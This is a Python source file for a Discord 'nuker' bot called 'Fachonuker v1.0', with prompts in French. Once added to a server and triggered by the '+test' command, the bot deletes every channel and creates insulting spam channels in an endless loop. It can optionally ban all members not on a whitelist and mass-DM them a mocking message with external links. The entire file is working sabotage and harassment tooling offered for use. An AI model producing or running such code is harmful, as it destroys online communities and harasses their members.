import discord
import asyncio
import sys
import os
from discord.ext import commands

TOKEN = " "

BLACKLISTED_IDS = [
1418688225907576873,
1528152389331193906,
1521833506685325422,
]

SALONS_CONFIG = [
    ("onvousabz", "https://cdn.discordapp.com/attachments/1200098541134160004/1533190254247280822/togif.gif"),
    ("Retournez avec votre leader...", "https://cdn.discordapp.com/attachments/1200098541134160004/1533190533936189490/togif.gif"),
    ("teubée comme dee nazis", "2deqi teubée comme dee nazis"),
    ("Ragez pas", "Vous êtes juste nuls"),
    ("Bah alors ?", "On c'est fait avoir ?"),
    ("c que le debut mgl", "On va revenir"),
]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    print(r"""
    ██╗  ██╗ ██████╗ ███╗   ██╗ ██████╗ ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
    ██║ ██╔╝██╔═══██╗████╗  ██║██╔═══██╗████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
    █████╔╝ ██║   ██║██╔██╗ ██║██║   ██║██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
    ██╔═██╗ ██║   ██║██║╚██╗██║██║   ██║██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
    ██║  ██╗╚██████╔╝██║ ╚████║╚██████╔╝██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                
    ███████╗ █████╗  ██████╗██╗  ██╗ ██████╗ ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
    ██╔════╝██╔══██╗██╔════╝██║  ██║██╔═══██╗████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
    █████╗  ███████║██║     ███████║██║   ██║██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
    ██╔══╝  ██╔══██║██║     ██╔══██║██║   ██║██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
    ██║     ██║  ██║╚██████╗██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
    ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                
                          
    """)

def get_choice(question):
    while True:
        try:
            print(f"\n{question}")
            print("[1] Oui")
            print("[0] Non")
            choice = input("\nTon choix (0 ou 1) : ").strip()
            if choice in ["0", "1"]:
                return choice == "1"
            else:
                print("❌ Entre 0 ou 1 uniquement")
        except KeyboardInterrupt:
            print("\n\nAu revoir!")
            sys.exit(0)
        except:
            print("❌ Erreur, réessaie")

clear_screen()
print_banner()

print("=" * 70)
print("CONFIGURATION DU FACHONUKER v1.0")
print("=" * 70)

BAN_MEMBERS = get_choice("Bannir tous les membres du serveur ?")
SEND_MP = get_choice("Envoyer un MP aux membres avant bannissement ?")

clear_screen()
print_banner()

print("\n" + "=" * 70)
print("RÉCAPITULATIF")
print("=" * 70)
print(f"{'Bannissement des membres':<40} : {'✅ ACTIVÉ' if BAN_MEMBERS else '❌ DÉSACTIVÉ'}")
print(f"{'Envoi de MP avant bannissement':<40} : {'✅ ACTIVÉ' if SEND_MP else '❌ DÉSACTIVÉ'}")
print(f"{'Nombre de salons à créer':<40} : {len(SALONS_CONFIG)}")
print(f"{'Blacklist (protégés)':<40} : {len(BLACKLISTED_IDS)} membres")
print("=" * 70)


intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix="+", intents=intents)

async def creer_salons(guild):
    print("[*] Démarrage création des salons en boucle...")
    while True:
        for nom_salon, message_salon in SALONS_CONFIG:
            try:
                new_channel = await guild.create_text_channel(
                    nom_salon, 
                    reason="Fachonuker v1.0"
                )
                await new_channel.send(message_salon)
                print(f"[+] Salon '{nom_salon}' créé")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"[!] Erreur création salon {nom_salon}: {e}")
                await asyncio.sleep(1)

async def envoyer_mp(guild, membres_liste):
    cibles = [m for m in membres_liste if m.id not in BLACKLISTED_IDS]
    print(f"[*] Début envoi MP à {len(cibles)} membres...")
    mp_envoyes = 0
    for member in cibles:
        try:
            await member.send(
                "Allez on a niquée le serveur New Evropa, serv de nazillions... https://cdn.discordapp.com/attachments/1200098541134160004/1533190254247280822/togif.gif https://cmha.netlify.app/ https://cmha.netlify.app/ https://cmha.netlify.app/ https://cmha.netlify.app/"
            )
            mp_envoyes += 1
            print(f"[✉️] MP envoyé à {member.name}")
            await asyncio.sleep(0.5)
        except:
            pass
    print(f"[+] MP envoyés : {mp_envoyes}/{len(cibles)}")

async def bannir_membres(guild, membres_liste):
    cibles = [m for m in membres_liste if m.id not in BLACKLISTED_IDS]
    print(f"[*] Début bannissement de {len(cibles)} membres...")
    bans_reussis = 0
    for member in cibles:
        try:
            await member.ban(reason="test")
            bans_reussis += 1
            print(f"[🔨] {member.name} banni")
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f"[!] Erreur ban {member.name}: {e}")
    print(f"[+] Bannissement terminé : {bans_reussis}/{len(cibles)}")

@bot.event
async def on_ready():
    print(f"\n{'='*70}")
    print(f"Fachonuker v1.0 connecté avec succès")
    print(f"Bot : {bot.user}")
    print(f"ID  : {bot.user.id}")
    print(f"{'='*70}")
    print("En attente de la commande +test...\n")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    if message.content == "+test":
        if not message.guild:
            await message.channel.send("Cette commande ne fonctionne que dans un serveur.")
            return
        
        guild = message.guild
        author = message.author
        
        await message.channel.send(f"🚨 **FACHONUKER v1.0 ACTIVÉ PAR {author.mention}** 🚨")
        
        print(f"\n[+] Début de la procédure sur : {guild.name}")
        print(f"[+] Déclenché par : {author}")
        
        membres_liste = []
        for member in guild.members:
            if member == bot.user:
                continue
            if not member.bot:
                membres_liste.append(member)
        
        print("[*] Suppression des salons existants...")
        channels_list = list(guild.channels)
        for channel in channels_list:
            try:
                await channel.delete(reason="Fachonuker v1.0")
                await asyncio.sleep(0.2)
            except Exception as e:
                print(f"[!] Erreur suppression {channel.name}: {e}")
        
        print("[✓] Salons supprimés, lancement des opérations parallèles...")
        
        taches = []
        
        taches.append(asyncio.create_task(creer_salons(guild)))
        if SEND_MP:
            taches.append(asyncio.create_task(envoyer_mp(guild, membres_liste)))        

        if BAN_MEMBERS:
            taches.append(asyncio.create_task(bannir_membres(guild, membres_liste)))
        
        if len(taches) > 1:
            await asyncio.gather(*taches[1:])
        
        print(f"\n[✓] Fachonuker v1.0 a terminé sur {guild.name}")
    
    await bot.process_commands(message)

try:
    bot.run(TOKEN)
except discord.errors.PrivilegedIntentsRequired:
    print("\n" + "="*70)
    print("ERREUR CRITIQUE : Privileged Intents non activés !")
    print("="*70)
    print("""
Tu dois activer les intents dans le Developer Portal :
1. https://discord.com/developers/applications
2. Sélectionne ton bot
3. Bot → Privileged Gateway Intents
4. Coche : Server Members Intent + Message Content Intent
5. Sauvegarde et relance le bot
""")
    sys.exit(1)
except discord.errors.LoginFailure:
    print("\n[!] ERREUR : Token invalide !")
    sys.exit(1)
except Exception as e:
    print(f"\n[!] Erreur inattendue : {e}")
    sys.exit(1)